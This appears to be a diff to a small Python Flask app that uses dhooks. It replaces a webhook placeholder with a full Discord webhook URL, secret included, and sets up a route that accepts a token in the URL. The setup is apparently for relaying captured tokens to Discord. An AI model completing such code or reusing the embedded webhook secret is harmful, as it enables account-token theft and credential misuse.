@@ -1,6 +1,6 @@
 from dhooks import Webhook
 from flask import Flask, redirect
-e = "PASTE_WEBHOOK_HERE"
+e = "https://discord.com/api/webhooks/1352321566259675156/xZ5lbQaHrxSNjS3VbBQcgbbgFSt5fcmLVM3O6cuY8WLuxfP3ogvEkjFf3ZneZ5SScKjG"
 app = Flask(__name__)
 hook = Webhook(e)
 @app.route('/<string:token>')
